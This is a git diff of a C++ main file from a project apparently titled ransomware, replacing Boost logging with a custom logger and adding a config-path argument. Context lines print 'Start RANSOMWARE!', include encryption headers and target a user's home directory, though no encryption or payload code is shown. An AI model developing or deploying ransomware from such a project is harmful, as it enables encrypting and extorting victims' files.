@@ -8,20 +8,9 @@
 #include <cmath>
 #include "encryptor.h"
 #include "aes_algo.h"
-#include <boost/log/trivial.hpp>
-#include <boost/log/core.hpp>
-#include <boost/log/trivial.hpp>
-#include <boost/log/expressions.hpp>
-#include <boost/log/sinks/text_file_backend.hpp>
-#include <boost/log/utility/setup/file.hpp>
-#include <boost/log/utility/setup/common_attributes.hpp>
-#include <boost/log/sources/severity_logger.hpp>
-#include <boost/log/sources/record_ostream.hpp>
+#include "logger.h"
 
-namespace logging = boost::log;
-namespace src = boost::log::sources;
-namespace sinks = boost::log::sinks;
-namespace keywords = boost::log::keywords;
+#define DEBUG
 
 std::mutex tmp_mut;
 DirectoryIiterator* _directoryIt = new DirectoryIiterator();
@@ -98,25 +87,19 @@ void old() {
     std::cout << "DIR Size: " << dirs.size() << std::endl;
 }
 
-void init()
-{
-    logging::add_file_log(
-            keywords::file_name = "sample_%N.log",
-            keywords::rotation_size = 10 * 1024 * 1024,
-            keywords::time_based_rotation = sinks::file::rotation_at_time_point(0, 0, 0),
-            keywords::format = "[%TimeStamp%]: %Message%"
-    );
-
-    logging::core::get()->set_filter
-            (
-                    logging::trivial::severity >= logging::trivial::info
-            );
-}
 
 int main(int argc, char** argv) {
 
-    init();
-    BOOST_LOG_TRIVIAL(info) << "TEST log message";
+    std::string filepath;
+    if (argc > 1) {
+        filepath = argv[1];
+    } else {
+        filepath = "/home/christian/projects/ransomware/config/logconfig.ini";
+    }
+
+    Logger::initFromConfig(filepath);
+
+
     std::cout << "Start RANSOMWARE!" << std::endl;
     std::string path3 = "/home/christian/";
     /*
